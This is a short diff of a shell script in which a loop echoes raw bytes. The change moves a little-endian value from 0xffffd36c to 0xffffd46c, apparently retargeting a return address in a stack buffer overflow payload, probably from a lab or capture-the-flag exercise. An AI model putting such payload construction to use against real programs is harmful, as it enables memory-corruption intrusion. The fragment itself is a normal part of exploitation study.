@@ -11,5 +11,5 @@ done
 
 for i in 1 2
 do
-	echo -ne "\x6c\xd3\xff\xff"
+	echo -ne "\x6c\xd4\xff\xff"
 done
